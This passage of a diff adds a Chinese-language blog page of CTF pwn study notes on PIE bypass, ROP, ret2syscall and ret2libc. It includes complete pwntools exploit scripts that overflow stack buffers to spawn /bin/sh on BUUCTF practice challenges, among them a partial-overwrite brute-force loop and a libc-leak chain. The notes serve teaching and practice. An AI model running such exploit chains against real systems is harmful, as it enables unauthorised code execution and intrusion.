+<p> 2 - 表示在1的基础上增加栈（heap）的随机化。</p>
+<p>PIE（Position-Independent Executables）: 位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化。主要是为了解决二进制本身地址已知的问题，可<strong>用来防御ret2elf和其他已知地址读写问题</strong>。</p>
+<p>程序的地址的规则为：<em><strong>基地址+偏移</strong></em>，程序的基地址是由系统决定的，但是偏移地址是<strong>固定</strong>的，是程序编译好之后就固定了</p>
+<h4 id="绕过方式-3"><a href="#绕过方式-3" class="headerlink" title="绕过方式"></a>绕过方式</h4><p><strong>方法一：Partial Write</strong><br>         部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页，通常来说，一个内存页大小为0x1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点，通过覆盖EIP的后8或16位(按字节写入,每字节8位)就可以快速爆破或者直接劫持EIP。</p>
+<p>顾名思义，就是写入部分的数据，来控制程序的执行流程，例如：程序都是使用偏移来定位指令，如果我们获取到了<code>backdoor</code>后门函数的偏移，将返回地址的后三位覆盖为<code>backdoor</code>的地址，从而执行<code>backdoor</code>函数。</p>
+<p>具体原理：因为程序运行起来的时候开启了pie和aslr，无法获取程序的准确地址，但是虽然前面的地址是不知道的，但是一个内存分页的大小为<code>0x1000</code>，这基本上确定了，偏移地址只能在<code>0~999</code>之间，一般情况下，返回地址都会在一个内存分页上，所以我们覆盖返回地址的后三位，从而执行<code>backdoor</code>函数<br>但是我们在覆盖的时候，写入三个十六进制的情况是很少的，一个字节为<code>8bit</code>，一个字节由四位十六进制组成，三位十六进制是<code>12bit</code>，因为我们平常写入都是一次性写入一个字节(8bit)，如果写入两个字节，就会有一个十六进制位是不确定的，这时就需要运气才能成功执行<code>backdoor</code>函数，但是我们可以使用爆破的方式，多次运行程序，总有一个会成功</p>
+<p>特点:1.程序不大,有后门函数等<br>         2.只需要爆破一个字节</p>
+<p><strong>例题</strong>：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Ej36NzBWt5BouBM7ieWgoA">https://pan.baidu.com/s/1Ej36NzBWt5BouBM7ieWgoA</a><br>提取码：15br</p>
+<p>1.pie_bypass1</p>
+<p>wp</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-18 105919.png)</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120411127-602180245.png)</p>
+<p><code>buf</code>存在栈溢出，同时找到了一个backdoor函数</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120442571-1052218031.png)</p>
+<p>backdoor地址可以通过ida找到</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120751667-608044637.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-18 110202.png)</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xF0&quot;</span> + <span class="string">b&quot;\x06&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * padding + backdoor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	p = process(<span class="string">&quot;./pie_bypass1&quot;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span>(count,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">b&quot;Leave a message!\n&quot;</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		recv = p.recv(timeout=<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二:直接泄露地址</strong></p>
+<p>​        因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址，如果我们可以泄露出一个程序或libc的某些地址，我们就可以利用地址减去偏移地址得到基地址，从而算出其他函数的地址,这种方法也是我们最常用的方法。                通过泄露地址来计算libc基地址的时候,需要注意的是<strong>libc版本不同,对应的偏移也不同。</strong></p>
+<ul>
+<li><strong>寻找没有随机化的模块，直接RET替换</strong>（一般进程也会加载没有随机化的模块，可以找到JMP ESP指令的跳板直接调用）</li>
+<li><strong>寻找没有随机化的模块，替换EIP一部分</strong>（找到没有随机化的模块然后使用利息泄漏确定EIP的位置，再算出模块的基地址，最后算出要跳的函数地址）</li>
+<li><strong>NOP喷射</strong>  DEP没开的情况下，创建一大块NOP+shellcode，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。slide code（滑板指令）一般是NOP指令，譬如：0x0C（0x0C0C代表的x86指令是OR AL 0x0C），0x0D等等，不影响程序的执行的。</li>
+<li><strong>暴力</strong>（如果漏洞不会造成程序崩溃，可以暴力测试256种模块基地址来测试，只到有满足的）<strong>最LOW</strong></li>
+</ul>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="****ROP"></a>****ROP</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10</a></p>
+<p><strong>ROP 主要原理</strong>是通过控制内存中的一段数据，通过控制数据来控制代码执行流，如组合执行内核中特定的代码片段，从而达到修改内核中的关键数据，达到提取权限的目的。这种攻击方式是需要进行不同机型中查找到多段代码片段，如果需要 root 的机型较多，则需要攻击者投入较多精力去做适配。</p>
+<p><strong>ROP攻击的思想</strong>就是：在栈溢出的基础上，努力去代码段（可执行区域）拼凑出机器指令的片段，完成要执行攻击的逻辑。</p>
+<p>如 <strong>ret2data、ret2libc、ret2strcpy、ret2gets、ret2syscall</strong></p>
+<p>ROP攻击执行需要满足如下两个条件：</p>
+<ul>
+<li>程序存在溢出点（如C语言的gets等不安全的函数），并且可以控制返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址（如系统调用相关函数system等）</li>
+</ul>
+<p>gadgets:以<strong>ret</strong>结尾的指令序列,通过这些指令序列,我们可以修改某些地址的内容,方便控制程序的执行流程.</p>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>**控制程序执行程序本身已有的代码(.text),**这种攻击方法其实就是当程序中本来就包含了可以使我们获得shell或其他功能的代码,我们只需要通过栈溢出将返回地址覆盖为这段代码的起始地址就可以了</p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15851216.html">https://www.cnblogs.com/ZIKH26/articles/15851216.html</a></p>
+<p>通过执行gadgets改变寄存器的值然后控制程序<strong>执行系统调用</strong>(见编写简单的shellcode)</p>
+<p>常用gadgets</p>
+<p>32位</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710145426.jpg)</p>
+<p>64位</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710151642.jpg)</p>
+<h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a><strong>例题</strong></h4><p>inndy_rop <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_rop">BUUCTF在线评测 (buuoj.cn)</a></p>
+<p>cmcc_simplerop <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTF在线评测 (buuoj.cn)</a></p>
+<h5 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h5><p>1.checksec 查看保护情况,32位,NX保护(不能用ret2shellcode),静态链接(不能用ret2libc)</p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720753375527.png"></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720753045679.png"></p>
+<p>2.拖入IDA,main函数,进入overflow函数,发现gets,栈溢出</p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720753639048.png"></p>
+<p>3.将&#x2F;bin&#x2F;sh写入bss段</p>
+<p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数&#x2F;bin&#x2F;sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+&#x27;/bin&#x27;</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+4)+p32(pop_[ecx]_addr)+&#x27;/sh\x00&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我先来解释一下个payload。</p>
+<p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址 bss_addr指的将参数写入bss段的具体地址</p>
+<p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数&#x2F;bin就是我们的参数</p>
+<p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数&#x2F;bin&#x2F;sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\企业微信截图_17203377649750.png)</p>
+<p>第二种方法，等到可以溢出的时候，用rop，<strong>先去把返回地址处放置一个read函数，然后再把&#x2F;bin&#x2F;sh写入指定的地址（把该地址放在read函数第二个参数即可）****然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）</strong><br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p>
+<p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p>
+<p>4.获得偏移量</p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720754209540.png"></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720754324165.png"></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720754413187.png"></p>
+<p><img src="C:\Users\30451\Pictures\Screenshots\1720754475111.png"></p>
+<p>5.编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29334</span>)</span><br><span class="line"><span class="comment">#d=process(&#x27;./rop&#x27;)</span></span><br><span class="line">int_0x80_addr=<span class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBAAE</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">b&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.simplerop</p>
+<p><strong>wp</strong></p>
+<p>查看保护情况，静态链接，NX保护</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 155031.png)</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127203918982-250461252.png)</p>
+<p>没有canary，并且这里存在溢出，因此我们可以rop。</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204005942-290500809.png)</p>
+<p>我们现在需要去找gadget片段。</p>
+<p><strong>因为我们需要设置eax,ebx,ecx,edx这四个寄存器的参数，因此需要去分别找pop这四个寄存器的指令。</strong></p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204033314-1369511097.png)</p>
+<p>这里直接就发现了连续pop三个寄存器的指令，比较nice。</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204105424-1865663775.png)</p>
+<p>寄存器找完了，现在最大的问题就是怎么把&#x2F;bin&#x2F;sh给传进去？</p>
+<p>这道题没有类似于pop [ecx]这类指令，因此我们只能另辟蹊径。</p>
+<p><strong>因为存在read函数(如果没有read函数的话，那就系统调用，不过我试了一下，没成功，但原理上是可行的)<strong>，因此我们可以先把read的地址放到返回地址，再执行一次read，将参数写入我们指定的bss段地址，（</strong>为什么要写入bss段，是因为没开pie的情况下，bss段地址是不变的，并且这道题的bss段是可写，这样我们写入参数之后，直接再拿写入的那个bss地址当做ebx的参数即可，如果是写入栈中的话，还需要泄露栈中地址</strong>）</p>
+<p>并且值得一提的是，我们<strong>之后使用pop eax+p32(0xb)这种指令的前提是此时栈顶要是0xb才可以，但是当我们执行read之后，它的三个参数都是在栈顶的，因此我们需要pop三次，把read的参数先给弹出来，这样才能顺理传之后的参数</strong>。</p>
+<p><strong>最后要注意的一个点就是，这道题用IDA看，距离返回地址是0x18,但是用gdb调试一下发现，它距离返回地址实际上是0x20。</strong></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25020</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./simplerop&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bae06</span></span><br><span class="line">pop_ebx=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806e851</span></span><br><span class="line">pop_edx=<span class="number">0x0806e82a</span></span><br><span class="line">int_0x80=<span class="number">0x080493e1</span></span><br><span class="line">bss_addr=<span class="number">0x080EAFF0</span></span><br><span class="line">read_addr=<span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p32(read_addr)+p32(pop_edx_ecx_ebx)<span class="comment">#这三个pop处于read函数的返回地址，连续pop三次，把栈顶的内容弹出来</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)<span class="comment">#read函数的参数</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">11</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)<span class="comment">#弹给eax的内容是11，因为11是32位程序execve的系统调用号</span></span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#这里一定要输入这个\x00去截断</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc(*)"></a>ret2libc(*)</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403">https://blog.csdn.net/Bossfrank/article/details/134872403</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17856141.html">https://www.cnblogs.com/falling-dusk/p/17856141.html</a></p>
+<h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><p>由很多目标文件进行链接形成的是静态库，反之静态库也可以简单地看成是一组目标文件的集合，即很多目标文件经过压缩打包后形成的一个文件，如下图，使用ar命令的-a参数查看静态库的组成：</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\40f16dcdcaf3c8342f711808b682edee.png)</p>
+<p>以下面这个图来简单说明一下从静态链接到可执行文件的过程，根据在源文件中包含的头文件和程序中使用到的库函数，如stdio.h中定义的printf()函数，在libc.a中找到目标文件printf.o(这里暂且不考虑printf()函数的依赖关系)，然后将这个目标文件和我们hello.o这个文件进行链接形成我们的可执行文件。<br>![](F:\er jin zhi\pwn\笔记截图\7e6455e8b7c3faaf6ab19821fa12002b.png)</p>
+<p>​        这里有一个小问题，就是从上面的图中可以看到静态运行库里面的一个目标文件只包含一个函数，如libc.a里面的printf.o只有printf()函数，strlen.o里面只有strlen()函数。</p>
+<p>​        我们知道，链接器在链接静态链接库的时候是以目标文件为单位的。比如我们引用了静态库中的printf()函数，那么链接器就会把库中包含printf()函数的那个目标文件链接进来，如果很多函数都放在一个目标文件中，很可能很多没用的函数都被一起链接进了输出结果中。由于运行库有成百上千个函数，数量非常庞大，每个函数独立地放在一个目标文件中可以尽量减少空间的浪费，那些没有被用到的目标文件就不要链接到最终的输出文件中。</p>
+<p><strong>优缺点</strong></p>
+<p>静态链接的缺点，一是浪费空间，因为每个可执行程序中对所有需要的目标文件都要有一份副本，所以如果多个程序对同一个目标文件都有依赖，如多个程序中都调用了printf()函数，则这多个程序中都含有printf.o，所以同一个目标文件都在内存存在多个副本；另一方面就是更新比较困难，因为每当库函数的代码修改了，这个时候就需要重新进行编译链接形成可执行程序。</p>
+<p>静态链接的优点，在可执行程序中已经具备了所有执行程序所需要的任何东西，在执行的时候运行速度快。</p>
+<h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h4><p>动态链接出现的原因就是为了解决静态链接中提到的两个问题，一方面是空间浪费，另外一方面是更新困难。</p>
+<p>动态链接的基本思想是把程序按照模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形成一个完整的程序，而不是像静态链接一样把所有程序模块都链接成一个单独的可执行文件。</p>
+<p>动态链接的优点，就是即使需要每个程序都依赖同一个库，但是该库不会像静态链接那样在内存中存在多分，副本，而是这多个程序在执行时共享同一份副本；另一个优点是，更新也比较方便，更新时只需要替换原来的目标文件，而无需将所有的程序再重新链接一遍。当程序下一次运行时，新版本的目标文件会被自动加载到内存并且链接起来，程序就完成了升级的目标。但是动态链接也是有缺点的，因为把链接推迟到了程序运行时，所以每次执行程序都需要进行链接，所以性能会有一定损失。</p>
+<p><strong>动态链接如何重定位</strong></p>
+<p>虽然动态链接把链接过程推迟到了程序运行时，但是在形成可执行文件时（注意形成可执行文件和执行程序是两个概念），还是需要用到动态链接库。比如我们在形成可执行程序时，发现引用了一个外部的函数，此时会检查动态链接库，发现这个函数名是一个动态链接符号，此时可执行程序就不对这个符号进行重定位，而把这个过程留到装载时再进行。</p>
+<p><strong>必须为动态链接才能用ret2libc</strong></p>
+<p><strong>基本方法:1.找system函数的地址2.找”&#x2F;bin&#x2F;sh”字符串的地址</strong></p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710152510.jpg)</p>
+<h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><p><strong>BUUCTF   jarvisoj level3 x64</strong></p>
+<p>wp</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 152831.png)</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\95f2be663b699dd8d6310a4564f0739d.png)</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\876bae18df2c60990669444532b12e70.png)</p>
+<p>输入点buf明显的溢出漏洞，read之前已经调用过一个write函数了，可以利用它来泄露libc版本</p>
+<p>1.泄露libc版本<br>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br>我们这边要利用write函数去泄露libc版本<br>write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br></pre></td></tr></table></figure>
+
+<p>利用ROPgadget找一下设置<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020">寄存器</a>的指令</p>
+<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240723165808.png)</p>
+<p>2.计算出程序里的system和bin&#x2F;sh的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3.构造payload，获取shell</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./level3_x64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28596</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(name)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4006b3</span></span><br><span class="line">rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Craft payload to leak write@got address</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_r15) + p64(write_got) + p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Receive data until we find the expected byte sequence</span></span><br><span class="line">recv_data = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">write_addr = u64(recv_data[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use LibcSearcher to find libc base and addresses</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Craft payload to execute system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(rdi) + p64(binsh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+  
+</div>
+          </div>
+        </div>
+
+        <link rel="stylesheet" href="/css/footer.css">
+<div class="bottom-outer">
+  <div class="copyright">©2021 - 2021 By Tanger</div>
+  <div class="framework-info">
+    <span>Power by</span>
+    <a class="a1" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    <span class="footer-separator">|</span>
+    <span>Theme by</span>
+    <a class="a2" target="_blank" rel="noopener" href="https://github.com/redhat123456/hexo-theme-MiHoYo">MiHoYo</a>
+  </div>
+</div>
+
+          
+            <!-- scripts list from theme config.yml -->
+            
+              <script src="/js/MiHoYo.js"></script>
+              
+                
+
+  </body>
+
+  </html>
